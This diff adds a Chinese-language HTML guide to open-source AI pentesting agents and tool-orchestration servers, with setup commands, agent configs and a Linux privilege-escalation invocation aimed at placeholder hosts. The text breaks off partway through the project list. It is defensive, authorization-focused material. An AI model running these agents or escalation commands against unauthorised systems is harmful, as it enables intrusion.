@@ -1,0 +1,1721 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AI Agent 红队网络攻防 · 开源项目地图与使用手册</title>
+<style>
+:root{
+  --ink:#14181d;
+  --ink-2:#3d4650;
+  --ink-3:#6b7480;
+  --bg:#fbfbf8;
+  --panel:#ffffff;
+  --line:#e2e2db;
+  --line-2:#efefe9;
+  --accent:#0b6b63;
+  --accent-soft:#e6f2f0;
+  --warn:#8a5210;
+  --warn-soft:#fdf3e3;
+  --danger:#9b2c2c;
+  --code-bg:#1b2027;
+  --code-ink:#dfe6ee;
+  --radius:10px;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Noto Sans SC","Microsoft YaHei",sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--ink);
+  font-family:var(--sans);font-size:16px;line-height:1.68;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:var(--accent)}
+a:focus-visible,button:focus-visible,summary:focus-visible,input:focus-visible{
+  outline:2px solid var(--accent);outline-offset:2px;border-radius:4px;
+}
+.skip{
+  position:absolute;left:-9999px;top:0;background:var(--ink);color:#fff;
+  padding:10px 16px;z-index:99;border-radius:0 0 8px 0;
+}
+.skip:focus{left:0}
+
+/* ---------- hero ---------- */
+.hero{
+  border-bottom:1px solid var(--line);
+  background:
+    radial-gradient(1100px 320px at 12% -10%, #e9f4f2 0%, rgba(233,244,242,0) 70%),
+    radial-gradient(900px 300px at 88% -20%, #f6efe4 0%, rgba(246,239,228,0) 70%),
+    var(--bg);
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+.hero .wrap{padding-top:56px;padding-bottom:34px}
+.eyebrow{
+  font-family:var(--mono);font-size:12px;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--accent);margin:0 0 14px;
+}
+h1{
+  font-size:clamp(28px,4.4vw,46px);line-height:1.18;margin:0 0 16px;
+  letter-spacing:-.015em;font-weight:750;
+}
+h1 small{display:block;font-size:clamp(15px,1.9vw,19px);font-weight:500;color:var(--ink-2);margin-top:12px;letter-spacing:0}
+.lede{max-width:66ch;color:var(--ink-2);font-size:17px;margin:0 0 22px}
+.stamps{display:flex;flex-wrap:wrap;gap:8px;margin-top:4px}
+.stamp{
+  font-family:var(--mono);font-size:12px;color:var(--ink-2);
+  border:1px solid var(--line);background:var(--panel);
+  padding:4px 10px;border-radius:999px;
+}
+
+/* ---------- toc ---------- */
+.toc{
+  position:sticky;top:0;z-index:20;
+  background:rgba(251,251,248,.92);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.toc .wrap{display:flex;gap:4px;overflow-x:auto;padding-top:8px;padding-bottom:8px}
+.toc a{
+  font-size:14px;text-decoration:none;color:var(--ink-2);white-space:nowrap;
+  padding:6px 12px;border-radius:999px;
+}
+.toc a:hover{background:var(--line-2);color:var(--ink)}
+
+/* ---------- sections ---------- */
+section{padding:52px 0;border-bottom:1px solid var(--line-2)}
+section:last-of-type{border-bottom:0}
+h2{font-size:clamp(21px,2.6vw,28px);margin:0 0 6px;letter-spacing:-.01em;font-weight:720}
+h2 .num{
+  font-family:var(--mono);font-size:13px;color:var(--accent);
+  display:block;margin-bottom:8px;letter-spacing:.1em;font-weight:600;
+}
+.sub{color:var(--ink-3);margin:0 0 26px;max-width:70ch}
+h3{font-size:16px;margin:0;font-weight:700}
+h4{font-size:14.5px;margin:0 0 8px;font-weight:700;color:var(--ink)}
+p{margin:0 0 12px}
+
+/* ---------- 四象限 ---------- */
+.quad{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px;margin-bottom:26px}
+.quad article{
+  background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);
+  padding:18px 18px 16px;
+}
+.quad .k{font-family:var(--mono);font-size:11.5px;color:var(--accent);letter-spacing:.1em}
+.quad h3{margin:6px 0 8px;font-size:15.5px}
+.quad p{font-size:14px;color:var(--ink-2);margin:0}
+
+/* ---------- 筛选 ---------- */
+.controls{
+  display:flex;flex-wrap:wrap;gap:10px;align-items:center;
+  margin-bottom:8px;padding:14px;background:var(--panel);
+  border:1px solid var(--line);border-radius:var(--radius);
+  position:sticky;top:45px;z-index:15;
+}
+.search{
+  flex:1 1 220px;min-width:180px;display:flex;gap:8px;align-items:center;
+  border:1px solid var(--line);border-radius:8px;padding:6px 10px;background:#fff;
+}
+.search input{
+  border:0;outline:0;font:inherit;font-size:14px;width:100%;background:transparent;color:var(--ink);
+}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.search span{white-space:nowrap;flex:0 0 auto}
+.chip{
+  font:inherit;font-size:13px;cursor:pointer;
+  border:1px solid var(--line);background:#fff;color:var(--ink-2);
+  padding:5px 11px;border-radius:999px;line-height:1.4;
+}
+.chip:hover{border-color:var(--ink-3)}
+.chip[aria-pressed="true"]{background:var(--ink);border-color:var(--ink);color:#fff}
+.count{font-family:var(--mono);font-size:12px;color:var(--ink-3);width:100%}
+.empty{
+  text-align:center;color:var(--ink-3);padding:36px 16px;
+  border:1px dashed var(--line);border-radius:var(--radius);
+}
+
+/* ---------- 卡片 ---------- */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:16px;margin-top:16px;align-items:start}
+.card{
+  background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);
+  padding:18px;display:flex;flex-direction:column;gap:10px;
+}
+.card[hidden]{display:none}
+.card-h{display:flex;align-items:flex-start;justify-content:space-between;gap:10px}
+.card-h h3{font-size:16.5px}
+.tag{
+  font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;
+  padding:3px 8px;border-radius:5px;white-space:nowrap;
+  border:1px solid currentColor;opacity:.95;
+}
+.tag.agent{color:#0b6b63;background:#e9f4f2}
+.tag.orch{color:#3b4f9b;background:#eceffb}
+.tag.disc{color:#7a4a12;background:#fbf1e2}
+.tag.emu{color:#7a2f4e;background:#fbecf2}
+.tag.bench{color:#4a4a4a;background:#eeeeea}
+.tag.llm{color:#5a3a86;background:#f2ecfa}
+.meta{font-family:var(--mono);font-size:11.5px;color:var(--ink-3);margin:0}
+.desc{font-size:14.2px;color:var(--ink-2);margin:0}
+.facts{display:grid;grid-template-columns:max-content 1fr;gap:3px 12px;font-size:13px;margin:2px 0 0;align-content:start}
+.facts dt{color:var(--ink-3);white-space:nowrap}
+.facts dd{margin:0;color:var(--ink-2)}
+details{border-top:1px solid var(--line-2);padding-top:10px;margin-top:auto}
+details summary{
+  cursor:pointer;font-size:13.5px;font-weight:600;color:var(--accent);
+  list-style:none;display:flex;align-items:center;gap:6px;
+}
+details summary::-webkit-details-marker{display:none}
+details summary::before{content:"▸";font-size:11px;transition:transform .15s}
+details[open] summary::before{transform:rotate(90deg)}
+.note{font-size:12.5px;color:var(--ink-3);margin:8px 0 0}
+.note strong{color:var(--warn)}
+
+/* ---------- 代码 ---------- */
+.codewrap{position:relative;margin:10px 0 0}
+pre{
+  margin:0;background:var(--code-bg);color:var(--code-ink);
+  border-radius:8px;padding:14px 14px 14px;overflow-x:auto;
+  font-family:var(--mono);font-size:12.5px;line-height:1.62;
+}
+pre code{font-family:inherit;white-space:pre}
+.card pre,.card pre code{white-space:pre-wrap;overflow-wrap:anywhere}
+.card pre{font-size:12px;padding:12px}
+pre .c{color:#7f8d9c}
+pre .p{color:#8fd3a8}
+.copy{
+  position:absolute;top:8px;right:8px;font-family:var(--mono);font-size:11px;
+  background:rgba(255,255,255,.1);color:#cfd8e2;border:1px solid rgba(255,255,255,.18);
+  border-radius:5px;padding:3px 8px;cursor:pointer;
+}
+.copy:hover{background:rgba(255,255,255,.2);color:#fff}
+
+/* ---------- 表格 ---------- */
+.tablewrap{overflow-x:auto;border:1px solid var(--line);border-radius:var(--radius);background:var(--panel)}
+table{border-collapse:collapse;width:100%;font-size:13.6px;min-width:600px}
+th,td{text-align:left;padding:10px 14px;border-bottom:1px solid var(--line-2);vertical-align:top}
+th{background:#f6f6f2;font-weight:700;font-size:12.5px;color:var(--ink-2);white-space:nowrap}
+tr:last-child td{border-bottom:0}
+td code,p code,li code,.facts code{
+  font-family:var(--mono);font-size:.9em;background:#f0f0ea;
+  padding:1px 5px;border-radius:4px;color:#3b4652;
+}
+
+/* ---------- 流水线 ---------- */
+.pipe{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;margin:18px 0 8px;counter-reset:step;}
+@media (min-width:1100px){#case .pipe{grid-template-columns:repeat(5,minmax(0,1fr))}}
+@media (max-width:900px){.pipe{grid-template-columns:repeat(2,minmax(0,1fr))}}
+@media (max-width:560px){.pipe{grid-template-columns:1fr}}
+.step{
+  position:relative;background:var(--panel);border:1px solid var(--line);
+  border-radius:var(--radius);padding:14px 14px 12px;
+}
+.step::before{
+  counter-increment:step;content:counter(step,decimal-leading-zero);
+  font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:.1em;display:block;margin-bottom:6px;
+}
+.step b{display:block;font-size:14px;margin-bottom:4px}
+.step span{font-size:12.5px;color:var(--ink-3);line-height:1.5;display:block}
+.step.out{border-color:#bcd9d5;background:var(--accent-soft)}
+
+/* ---------- 闸门 ---------- */
+.gates{list-style:none;padding:0;margin:18px 0 0;display:grid;gap:10px}
+.gates li{
+  display:grid;grid-template-columns:26px 1fr;gap:12px;
+  background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:14px;
+}
+.gates .n{
+  font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;background:var(--ink);
+  width:26px;height:26px;border-radius:50%;display:grid;place-items:center;
+}
+.gates b{display:block;font-size:14px;margin-bottom:3px}
+.gates p{margin:0;font-size:13.4px;color:var(--ink-2)}
+
+/* ---------- tabs ---------- */
+.tabs{margin-top:18px}
+.tablist{display:flex;gap:4px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:0}
+.tab{
+  font:inherit;font-size:13.5px;cursor:pointer;background:transparent;
+  border:1px solid transparent;border-bottom:0;color:var(--ink-3);
+  padding:8px 14px;border-radius:8px 8px 0 0;
+}
+.tab[aria-selected="true"]{background:var(--panel);border-color:var(--line);color:var(--ink);font-weight:650}
+.tabpanel[hidden]{display:none}
+.tabpanel{background:var(--panel);border:1px solid var(--line);border-top:0;border-radius:0 0 var(--radius) var(--radius);padding:18px}
+.tabpanel h4{margin-bottom:10px}
+.doc{background:#fdfdfa;border-left:3px solid var(--accent);padding:14px 16px;border-radius:0 8px 8px 0;font-size:14px}
+.doc .h{font-family:var(--mono);font-size:12px;color:var(--ink-3);margin-bottom:8px}
+.doc ul{margin:8px 0 0;padding-left:20px;font-size:13.8px;color:var(--ink-2)}
+.doc li{margin-bottom:5px}
+
+.badge{font-family:var(--mono);font-size:11px;padding:2px 7px;border-radius:5px;border:1px solid currentColor;white-space:nowrap;font-weight:500;vertical-align:middle}
+.badge.real{color:#0b6b63;background:#e9f4f2}
+.badge.demo{color:#8a5210;background:#fdf3e3}
+/* ---------- callout ---------- */
+.callout{
+  border:1px solid var(--line);border-left:3px solid var(--warn);background:var(--warn-soft);
+  border-radius:0 8px 8px 0;padding:14px 16px;font-size:14px;color:#5b3b12;margin:18px 0 0;
+}
+.callout strong{color:var(--warn)}
+.callout.ok{border-left-color:var(--accent);background:var(--accent-soft);color:#0d4a45}
+.callout.ok strong{color:#0d4a45}
+
+/* ---------- 双栏 ---------- */
+.cols{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:18px;margin-top:18px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:18px}
+.panel h3{margin-bottom:10px;font-size:15.5px}
+.panel ul{margin:0;padding-left:19px;font-size:13.8px;color:var(--ink-2)}
+.panel li{margin-bottom:6px}
+.panel li b{color:var(--ink)}
+
+/* ---------- 选型 ---------- */
+.pick{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:14px;margin-top:18px}
+.pick article{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:16px}
+.pick .goal{font-size:13px;color:var(--accent);font-family:var(--mono);letter-spacing:.04em;margin-bottom:8px}
+.pick b{display:block;font-size:14.5px;margin-bottom:6px}
+.pick p{font-size:13.5px;color:var(--ink-2);margin:0}
+
+/* ---------- 链接 ---------- */
+.linklist{columns:2;column-gap:28px;font-size:13.6px;margin-top:16px}
+@media (max-width:720px){.linklist{columns:1}}
+.linklist div{break-inside:avoid;margin-bottom:10px}
+.linklist b{display:block;color:var(--ink)}
+.linklist a{word-break:break-all;font-family:var(--mono);font-size:12.4px}
+
+footer{padding:34px 0 60px;color:var(--ink-3);font-size:13px}
+footer .wrap{display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between}
+
+@media (max-width:640px){
+  .hero .wrap{padding-top:36px}
+  section{padding:38px 0}
+  .controls{position:static}
+  .wrap{padding:0 16px}
+}
+@media print{
+  .toc,.controls,.copy,.skip{display:none!important}
+  body{background:#fff;font-size:11pt}
+  section{page-break-inside:avoid;padding:16px 0}
+  .card,.panel,.step{page-break-inside:avoid}
+  pre{background:#f4f4f0;color:#111;border:1px solid #ddd}
+  pre .c{color:#666}
+  a{color:#111;text-decoration:underline}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">跳到正文</a>
+
+<header class="hero">
+  <div class="wrap">
+    <p class="eyebrow">Offensive AI · Open Source Landscape</p>
+    <h1>AI Agent 打网络，现在能用的开源东西
+      <small>六大类项目清单 · 每个工具的上手用法 · 渗透报告的生成与二次利用</small>
+    </h1>
+    <p class="lede">
+      这份文档回答三个问题：<strong>有哪些项目的名字你会在论文和靶场里反复看到</strong>、<strong>每个怎么跑起来（含真实命令形态）</strong>、
+      <strong>跑完之后那份"AI 写的渗透报告"该怎么生成、怎么验证、怎么用起来</strong>。
+      结论先说：端到端自主渗透 agent 目前在授权项目里更适合当"侦察扩散 + 报告草稿机"，最终定性必须有人。
+    </p>
+    <div class="stamps">
+      <span class="stamp">整理时间 2026-10-30</span>
+      <span class="stamp">29 个项目 / 6 大类</span>
+      <span class="stamp">命令以各仓库 README 为准</span>
+      <span class="stamp">仅限书面授权目标</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc" aria-label="章节导航">
+  <div class="wrap">
+    <a href="#overview">全景</a>
+    <a href="#tools">项目清单</a>
+    <a href="#report">报告生成</a>
+    <a href="#use">报告利用</a>
+    <a href="#case">实战案例</a>
+    <a href="#pick">怎么选</a>
+    <a href="#links">参考链接</a>
+  </div>
+</nav>
+
+<main id="main">
+<div class="wrap">
+
+<section id="overview">
+  <h2><span class="num">01 / MAP</span>"AI 红队"其实是四件不同的事</h2>
+  <p class="sub">名字混用是这块最大的认知成本。先分清你要的是哪一种，再谈选型——选错类的工具，跑多久都不会有结果。</p>
+
+  <div class="quad">
+    <article>
+      <span class="k">A · AUTONOMOUS PENTEST</span>
+      <h3>端到端自主渗透 Agent</h3>
+      <p>给目标，自己规划 recon → 打点 → 提权 → 出报告。代表：PentestGPT、CAI、PentAGI、Strix。热度和论文都集中在这里，也是坑最集中的地方。</p>
+    </article>
+    <article>
+      <span class="k">B · TOOL ORCHESTRATION</span>
+      <h3>工具编排 / MCP 胶水层</h3>
+      <p>不自己造 agent，只把 150+ 个传统工具包装成模型能调的接口。代表：HexStrike AI、Kali MCP。自建 agent 最省事的底座。</p>
+    </article>
+    <article>
+      <span class="k">C · VULN DISCOVERY</span>
+      <h3>漏洞发现与自动修复</h3>
+      <p>不追求"打进去"，追求"找到 + 复现 + 打补丁"。代表：AIxCC 四套 CRS、Vulnhuntr、OSS-Fuzz-Gen。真实工程价值最高的一类。</p>
+    </article>
+    <article>
+      <span class="k">D · EMULATION &amp; BENCH</span>
+      <h3>对抗模拟与评测基准</h3>
+      <p>前者（CALDERA）提供攻击动作空间，后者（Cybench、BountyBench）提供"凭什么说我的 agent 更强"的标尺。不做评测就没法做选型。</p>
+    </article>
+  </div>
+
+  <div class="callout">
+    <strong>另一条完全不同的赛道：</strong>"红队 LLM 本身"（jailbreak、prompt injection、越权工具调用）是另一个领域，项目是 Garak / PyRIT / promptfoo / PurpleLlama。
+    它们不打网络，打的是模型。本文把它们放在最后一类，只为避免混淆。
+  </div>
+
+  <div class="callout ok">
+    <strong>读完先记住一句：</strong>这个方向跑得最前面的其实是闭源的 XBOW / NodeZero / Pentera / RunSybil——它们有公开靶场成绩可对照。
+    开源项目的价值在于「可改造 + 可审计 + 可离线」，不在于「开箱即用打赢」。
+  </div>
+</section>
+
+<section id="tools">
+  <h2><span class="num">02 / INVENTORY</span>29 个项目，逐个给用法</h2>
+  <p class="sub">按类别筛选，或直接搜关键词（如"提权""patch""MCP"）。每个卡片点开「用法示例」看命令形态；命令与参数请以各仓库 README 为准，标注 <strong>用法示意</strong> 的表示接口形态可能已变动。</p>
+
+  <div class="controls">
+    <label class="search">
+      <span aria-hidden="true" style="font-size:13px;color:var(--ink-3)">检索</span>
+      <input id="q" type="search" placeholder="名称 / 用途 / 关键词，例如：提权、patch、CTF" aria-label="按名称或关键词筛选项目">
+    </label>
+    <div class="chips" role="group" aria-label="按类别筛选">
+      <button class="chip" type="button" data-cat="all" aria-pressed="true">全部 29</button>
+      <button class="chip" type="button" data-cat="agent" aria-pressed="false">自主渗透</button>
+      <button class="chip" type="button" data-cat="orch" aria-pressed="false">工具编排</button>
+      <button class="chip" type="button" data-cat="disc" aria-pressed="false">漏洞发现/修复</button>
+      <button class="chip" type="button" data-cat="emu" aria-pressed="false">对抗模拟</button>
+      <button class="chip" type="button" data-cat="bench" aria-pressed="false">评测基准</button>
+      <button class="chip" type="button" data-cat="llm" aria-pressed="false">LLM 红队</button>
+    </div>
+    <p class="count" id="count" aria-live="polite">显示 29 / 29</p>
+  </div>
+
+  <div class="grid" id="cards">
+
+    <!-- ===== 自主渗透 ===== -->
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>PentestGPT</h3><span class="tag agent">研究基线</span></div>
+      <p class="meta">GreyDGL · USENIX Security '24</p>
+      <p class="desc">这块的开创性工作。核心洞察是"模型不会用工具"：把任务拆成推理 / 生成 / 总结三件套 + 一棵任务树，让上下文不爆。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中（要配模型 key）</dd>
+        <dt>适合</dt><dd>论文 baseline、教学演示、理解任务规划</dd>
+        <dt>痛点</dt><dd>交互式、需人工粘工具输出；新版本已改成 agentic</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 1) 本地安装</span>
+git clone https://github.com/GreyDGL/PentestGPT &amp;&amp; cd PentestGPT
+pip install -e .
+
+<span class="c"># 2) 起会话（推荐容器里跑，避免污染本机）</span>
+docker run -it --rm -v "$PWD:/work" greyhat/pentestgpt
+<span class="c">#    镜像名以 README 为准</span>
+
+<span class="c"># 3) 会话里按阶段推进，工具输出要回填</span>
+<span class="p">&gt;</span> 目标 10.10.10.5，授权仅限该主机，先做端口与服务识别
+<span class="p">&gt;</span> [粘贴 nmap 输出] 根据这些结果更新任务树，给出下一步
+</code></pre>
+        <p class="note">它就是"任务树 + 人工回填"这套范式的教科书，读懂源码比直接用它更值。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>CAI — Cybersecurity AI</h3><span class="tag agent">工程化最好</span></div>
+      <p class="meta">Alias Robotics · Apache-2.0</p>
+      <p class="desc">开源里抽象做得最完整的一套：agent 定义、工具注册、执行作用域、成本追踪、可接本地模型。CTF / 靶场 / 赏金 / 漏洞复现都有官方用例。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>二次开发、需要离线模型的场景</dd>
+        <dt>痛点</dt><dd>抽象多，文档需要读代码补全</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install cai-framework
+export CAI_MODEL="alias1"        <span class="c"># 或指向自建 OpenAI 兼容端点</span>
+export ANTHROPIC_API_KEY=...
+
+cai                              <span class="c"># 默认交互 agent</span>
+</code></pre>
+<pre><code><span class="c"># 自己拼一个受约束的 agent</span>
+from cai.sdk.agents import Agent, run
+from cai.tools.reconnaissance.generic_linux_command import generic_linux_command
+from cai.tools.reconnaissance.exec_code import execute_code
+
+agent = Agent(
+    name="redteam",
+    instructions="仅测试 10.10.10.0/24；每步先写推理再执行；不确定就停。",
+    tools=[generic_linux_command, execute_code],
+    model="alias1",
+)
+run(agent, "对 10.10.10.5 做端口与版本识别，输出结构化结果")
+</code></pre>
+        <p class="note">想知道"agent 框架该怎么设计"就看它，胜过看十个 demo 仓库。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>PentAGI</h3><span class="tag agent">自建首选</span></div>
+      <p class="meta">vxcontrol · Go + Docker + Web UI</p>
+      <p class="desc">全自主多 agent 系统，工程完整度最高：每个 agent 独立容器、向量记忆、实时日志、可观测的执行图谱。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低（compose 一把起）</dd>
+        <dt>适合</dt><dd>内网自建、想看 agent 到底在干什么</dd>
+        <dt>痛点</dt><dd>token 烧得快；需要强 scope 限制</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>git clone https://github.com/vxcontrol/pentagi &amp;&amp; cd pentagi
+cp .env.example .env      <span class="c"># 填模型 key / 搜索 key</span>
+docker compose up -d
+
+<span class="c"># Web UI: http://localhost:8443  （端口以 README 为准）</span>
+<span class="c"># 新建 Flow → 填目标与授权范围 → 看 agent 图与实时日志</span>
+</code></pre>
+        <p class="note"><strong>务必</strong>在隔离网络里跑：它的 agent 有真实 shell，scope 靠你写在提示词里，不靠沙箱兜底。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>Strix</h3><span class="tag agent">热度高</span></div>
+      <p class="meta">usestrix · 2025 起大量讨论</p>
+      <p class="desc">主张"真的打出洞"而不是只报静态告警：动态验证 + 自动生成可复现 PoC，跑在 Docker 沙箱里。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低（pip 装完就能指目标）</dd>
+        <dt>适合</dt><dd>自家 Web 应用上线前自查</dd>
+        <dt>痛点</dt><dd>对复杂业务逻辑链路覆盖有限</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install strix-agent
+export STRIX_LLM="openai/gpt-5"
+export LLM_API_KEY="sk-..."
+
+strix --target ./my-app                          <span class="c"># 源码目录</span>
+strix --target https://staging.example.com       <span class="c"># 站点，须授权</span>
+</code></pre>
+        <p class="note">用法示意。适合当"上线前自动化冒烟"，别拿它替代人工渗透。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>Shannon</h3><span class="tag agent">Web 专精</span></div>
+      <p class="meta">Keygraph · AGPL</p>
+      <p class="desc">只做 Web 应用，但要的是"能真打穿"：白盒 + 黑盒结合，强调漏洞可达性与利用链，而不是 SAST 噪音堆。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中（要 Docker + 模型 key）</dd>
+        <dt>适合</dt><dd>有源码的 Web 项目做深度自查</dd>
+        <dt>痛点</dt><dd>AGPL，商用需评估许可</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>git clone https://github.com/KeygraphHQ/shannon &amp;&amp; cd shannon
+export ANTHROPIC_API_KEY=...
+
+./shannon start URL=https://staging.example.com REPO=acme/webapp
+<span class="c"># 产出 findings + PoC 复现步骤（接口以 README 为准）</span>
+</code></pre>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>hackingbuddyGPT</h3><span class="tag agent">学术可复现</span></div>
+      <p class="meta">FHStP / IPA</p>
+      <p class="desc">学术味最正的一支：Linux 提权（getroot）、Web API 测试都有，且附带可复现 benchmark，论文结论能自己对一遍。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>做研究、验证"LLM 提权到底行不行"</dd>
+        <dt>痛点</dt><dd>场景窄、工程化一般</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install hackingbuddyGPT
+
+<span class="c"># Linux 提权：给低权凭据，让它自己找并利用提权路径</span>
+python3 -m hackingbuddyGPT.getroot_linux \
+  --host 10.10.10.5 --username lowpriv --password 'pw' \
+  --enable_explanation
+</code></pre>
+        <p class="note">输出里的 <code>--enable_explanation</code> 是它的价值所在：每步为什么这么做，直接就是报告的素材。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>Nebula</h3><span class="tag agent">赏金向</span></div>
+      <p class="meta">BountyHunter · 2025</p>
+      <p class="desc">面向赏金场景：追求覆盖广度与报告质量，自动做资产扩展 + 漏洞分类，而不是死磕单点深挖。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>中</dd>
+        <dt>适合</dt><dd>资产面大的赏金/SRC 场景</dd>
+        <dt>痛点</dt><dd>用法示意，仓库迭代快</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 概念流程：安装 → 给种子资产 → 自动扩展与打点</span>
+git clone https://github.com/BountyHunterAI/nebula &amp;&amp; cd nebula
+pip install -e .
+nebula --target example.com --scope scope.txt
+</code></pre>
+        <p class="note"><strong>用法示意</strong>，请以仓库 README 为准。赏金场景务必守平台规则，越界即违规。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="agent">
+      <div class="card-h"><h3>BugTraceAI</h3><span class="tag agent">轻量</span></div>
+      <p class="meta">开源 · Web/API 黑盒</p>
+      <p class="desc">小而直接：给 URL 就跑一轮黑盒，输出漏洞列表。适合当"快速体检"或自建 agent 时的对照组。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>快速初筛、教学</dd>
+        <dt>痛点</dt><dd>深度有限，误报靠人筛</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>pip install bugtraceai
+bugtraceai --target https://staging.example.com
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。同类轻量项目很多，命名相近，认准官方仓库。</p>
+      </details>
+    </article>
+
+    <!-- ===== 工具编排 ===== -->
+    <article class="card" data-cat="orch">
+      <div class="card-h"><h3>HexStrike AI</h3><span class="tag orch">最省事的底座</span></div>
+      <p class="meta">0x4m4 · MCP Server</p>
+      <p class="desc">一个 MCP server 把 150+ 安全工具（nmap / ffuf / sqlmap / nuclei…）包成可调用接口，还带工具选择和参数建议。Claude、GPT、本地模型都能接。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>自建 agent 的工具层、不想自己写 wrapper</dd>
+        <dt>痛点</dt><dd>工具全开等于攻击面全开，必须裁剪</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>git clone https://github.com/0x4m4/hexstrike-ai &amp;&amp; cd hexstrike-ai
+python3 -m venv .venv &amp;&amp; source .venv/bin/activate
+pip install -r requirements.txt
+
+python3 hexstrike_server.py --port 8888 --debug            <span class="c"># 执行端</span>
+python3 hexstrike_mcp.py --server http://localhost:8888    <span class="c"># MCP 桥</span>
+</code></pre>
+<pre><code><span class="c">// 客户端 mcp 配置</span>
+{
+  "mcpServers": {
+    "hexstrike-ai": {
+      "command": "python3",
+      "args": ["/abs/path/hexstrike_mcp.py", "--server", "http://localhost:8888"],
+      "timeout": 300
+    }
+  }
+}
+</code></pre>
+        <p class="note">关键动作是<strong>白名单</strong>：只暴露你这次授权需要的 10 个工具，其余关掉。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="orch">
+      <div class="card-h"><h3>Kali MCP / PentestMCP</h3><span class="tag orch">MCP 胶水</span></div>
+      <p class="meta">社区 · 多个实现</p>
+      <p class="desc">把 Kali 工具集暴露成 MCP 接口，同类项目多、质量参差。优势是模型侧零改造，劣势是没有规划能力，得自己写 agent 逻辑。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>已有 agent 框架，只缺工具层</dd>
+        <dt>痛点</dt><dd>选型要看是否支持异步/超时/并发</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code><span class="c"># 典型形态：容器起 Kali，暴露 MCP 端口</span>
+docker run -it --rm -p 5000:5000 kalilinux/kali-rolling
+<span class="c"># 然后在 mcp 配置里指向该端点，工具调用即落到容器内的 nmap/nuclei</span>
+</code></pre>
+        <p class="note"><strong>用法示意</strong>。挑项目时优先看：是否限制并发、是否有超时、是否禁止破坏性命令。</p>
+      </details>
+    </article>
+
+    <article class="card" data-cat="orch">
+      <div class="card-h"><h3>Nuclei / Osmedeus</h3><span class="tag orch">非 AI 基座</span></div>
+      <p class="meta">projectdiscovery / j3ssie</p>
+      <p class="desc">本身不是 AI，但几乎所有 agent 的报告最终都落在这两个上：Nuclei 的模板是"可复用漏洞结论"的最小单元，Osmedeus 是 recon 流水线。</p>
+      <dl class="facts">
+        <dt>上手</dt><dd>低</dd>
+        <dt>适合</dt><dd>把 AI 结论固化成回归用例</dd>
+        <dt>痛点</dt><dd>—</dd>
+      </dl>
+      <details>
+        <summary>用法示例</summary>
+<pre><code>nuclei -u https://staging.example.com -severity high,critical -jsonl -o out.jsonl
+<span class="c"># 注意：-jsonl 输出是后面报告流水线最好的输入格式</span>
+</code></pre>
+        <p class="note">报告章节里会讲：AI 的 finding 应该被压成 nuclei 模板，才能真正回归。</p>
+      </details>
+    </article>
+
